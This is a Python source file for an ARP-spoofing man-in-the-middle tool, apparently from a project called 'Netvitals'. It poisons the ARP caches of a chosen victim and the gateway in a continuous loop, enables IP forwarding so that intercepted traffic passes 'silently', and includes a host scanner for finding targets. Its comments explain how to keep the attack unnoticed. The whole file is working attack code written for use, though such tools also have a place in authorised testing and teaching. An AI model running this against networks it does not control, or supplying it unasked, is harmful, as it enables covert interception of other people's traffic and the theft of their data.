#!/usr/bin/env python3
"""
arp_spoofer.py - ARP Spoofer / MITM tool for Netvitals.

Poisons the ARP cache of a target and gateway to intercept traffic.
Automatically restores ARP tables on exit (Ctrl+C).

Requires:
    - Python 3
    - scapy  (pip install scapy --break-system-packages)
    - Root 
    - Linux only
"""

import os
import sys
import time
import threading

try:
    from scapy.all import ARP, Ether, srp, send, conf
    conf.verb = 0  # suppress scapy's own output
except ImportError as e:
    print(f"[!] scapy is not installed. {e}")
    print("[!] Install it using the requirements.txt")
    sys.exit()


# ── Core ARP functions ────────────────────────────────────────────────────────

def get_mac(ip):
    """
    Send an ARP 'who has <ip>?' broadcast and return the real MAC address.
    Returns None if the host doesn't respond (host down / wrong IP).

    How it works:
        ARP request (op=1) is broadcast to ff:ff:ff:ff:ff:ff (everyone).
        The device that owns <ip> replies with its MAC.
        srp() = send + receive at layer 2 (Ethernet frame level).
    """
    arp_request  = ARP(pdst=ip)                        # "who has <ip>?"
    broadcast    = Ether(dst="ff:ff:ff:ff:ff:ff")      # send to everyone
    packet       = broadcast / arp_request             # combine layers
    answered, _  = srp(packet, timeout=2, retry=1)     # send & wait for reply

    if answered:
        return answered[0][1].hwsrc   # the replying device's MAC
    return None


def spoof(target_ip, spoof_ip, target_mac):
    """
    Send a fake ARP reply to target saying:
        '<spoof_ip> is at <our MAC>'

    This poisons target's ARP cache — they now think
    spoof_ip (the gateway) is us, so they send traffic to us instead.

    op=2 = ARP reply (we're sending an unsolicited reply — no one asked,
           but ARP blindly trusts it anyway. That's the vulnerability.)
    """
    packet = ARP(
        op=2,            # ARP reply
        pdst=target_ip,  # send to: victim
        hwdst=target_mac,# victim's real MAC (so it actually arrives)
        psrc=spoof_ip    # "I am the gateway" (lie)
        # hwsrc defaults to YOUR MAC automatically
    )
    send(packet)


def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Send a CORRECT ARP reply to undo the poisoning.
    Tells target: '<gateway_ip> is actually at <gateway_mac>'
    Sends multiple times (count=5) to make sure it sticks.
    """
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )
    send(packet, count=5)


def enable_ip_forward():
    """
    Tell Linux kernel to forward packets instead of dropping them.
    Without this, intercepted packets are dropped — victim loses internet
    and immediately notices something is wrong.
    With this, traffic flows normally through us — attack is invisible.
    """
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[+] IP forwarding enabled — traffic will pass through silently.")


def disable_ip_forward():
    """Restore IP forwarding to off after attack ends."""
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")


# ── Packet counter (runs in background thread) ────────────────────────────────

packet_count = 0
running      = True

def spoof_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
    """
    Continuously send spoofed ARP replies to both victim and gateway.

    Why continuous?
        ARP caches expire (usually 60s or less). If we stop sending,
        devices send fresh ARP requests, get real answers, and our
        poisoning breaks. We keep refreshing every 2 seconds to stay
        in the middle.

    We spoof BOTH directions:
        → Tell victim: "I am the gateway" (victim sends traffic to us)
        → Tell gateway: "I am the victim" (gateway sends replies to us)
    """
    global packet_count, running
    while running:
        spoof(victim_ip, gateway_ip, victim_mac)    # poison victim
        spoof(gateway_ip, victim_ip, gateway_mac)   # poison gateway
        packet_count += 2
        time.sleep(2)


def status_loop(victim_ip, gateway_ip):
    """Print a live packet count so you know the attack is running."""
    global running
    while running:
        print(
            f"\r[*] Intercepting {victim_ip} ↔ {gateway_ip} | "
            f"Packets sent: {packet_count}",
            end=""
        )
        time.sleep(1)


# ── Main attack flow ──────────────────────────────────────────────────────────

def run_attack(victim_ip, gateway_ip):
    global running, packet_count

    print(f"\n[*] Resolving MACs — sending ARP requests...")

    victim_mac = get_mac(victim_ip)
    if not victim_mac:
        print(f"[!] Could not find MAC for victim {victim_ip}.")
        print(f"[!] Make sure the device is online and on the same subnet.")
        return

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print(f"[!] Could not find MAC for gateway {gateway_ip}.")
        print(f"[!] Check your gateway IP with: ip route | grep default")
        return

    print(f"[+] Victim  {victim_ip}  →  MAC: {victim_mac}")
    print(f"[+] Gateway {gateway_ip}  →  MAC: {gateway_mac}")

    enable_ip_forward()

    print(f"\n[!] Attack running. Press Ctrl+C to stop and restore.\n")

    # run spoof + status display in background threads
    running = True
    packet_count = 0

    spoof_thread  = threading.Thread(target=spoof_loop,  args=(victim_ip, gateway_ip, victim_mac, gateway_mac), daemon=True)
    status_thread = threading.Thread(target=status_loop, args=(victim_ip, gateway_ip), daemon=True)

    spoof_thread.start()
    status_thread.start()

    try:
        spoof_thread.join()   # wait here until stopped
    except KeyboardInterrupt:
        pass
    finally:
        running = False
        time.sleep(1)   # let threads finish their last iteration

        print("\n\n[!] Stopping attack — restoring ARP tables...")
        restore(victim_ip,  gateway_ip, victim_mac,  gateway_mac)
        restore(gateway_ip, victim_ip,  gateway_mac, victim_mac)
        disable_ip_forward()
        print("[+] ARP tables restored. Network is back to normal.")
        print(f"[+] Total packets sent: {packet_count}")


# ── Menu ──────────────────────────────────────────────────────────────────────

def print_banner():
    print(f"""
  ╔═══════════════════════════════╗
  ║       ARP Spoofer / MITM      ║
  ║       Netvitals Project       ║
  ╚═══════════════════════════════╝""")


def print_menu():
    print(f"""
[1] Start ARP Spoof (MITM attack)
[2] Scan for live hosts (find target IPs)
[0] Exit
""")


def scan_hosts(subnet):
    """Quick ARP scan to discover live hosts on the subnet."""
    print(f"\n[*] Scanning {subnet} for live hosts...\n")
    arp     = ARP(pdst=subnet)
    ether   = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet  = ether / arp
    result, _ = srp(packet, timeout=3)

    if not result:
        print(f"[-] No hosts found. Check your subnet.")
        return

    print(f"{'IP':<20} {'MAC':<20}")
    print("-" * 40)
    for _, received in result:
        print(f"{received.psrc:<20} {received.hwsrc:<20}")
    print()


def get_default_gateway():
    """Read gateway from routing table."""
    try:
        output = os.popen("ip route | grep default").read()
        parts  = output.split()
        if "via" in parts:
            return parts[parts.index("via") + 1]
    except Exception:
        pass
    return None


def main():
    if os.geteuid() != 0:
        print(f"[!] This tool needs root. Run with sudo.")
        return 1

    print_banner()

    default_gateway = get_default_gateway()
    if default_gateway:
        print(f"[+] Detected default gateway: {default_gateway}")

    while True:
        print_menu()
        choice = input("Select option: ").strip()

        if choice == "0":
            print("Bye.")
            break

        elif choice == "1":
            victim_ip  = input("Enter victim IP address: ").strip()
            gateway_ip = input(
                f"Enter gateway IP [Enter for {default_gateway}]: "
            ).strip() or default_gateway

            if not victim_ip or not gateway_ip:
                print(f"[!] Both victim and gateway IPs are required.")
                continue

            run_attack(victim_ip, gateway_ip)

        elif choice == "2":
            import subprocess
            output = subprocess.check_output(["ip", "route"], text=True)
            subnet = None
            for line in output.splitlines():
                parts = line.split()
                if parts and "/" in parts[0] and "scope" in line and "link" in line:
                    subnet = parts[0]
                    break
            if not subnet:
                subnet = input("Could not detect subnet. Enter manually (e.g. 10.10.0.0/18): ").strip()
            scan_hosts(subnet)

        else:
            print(f"[!] Invalid option.")


if __name__ == "__main__":
    main()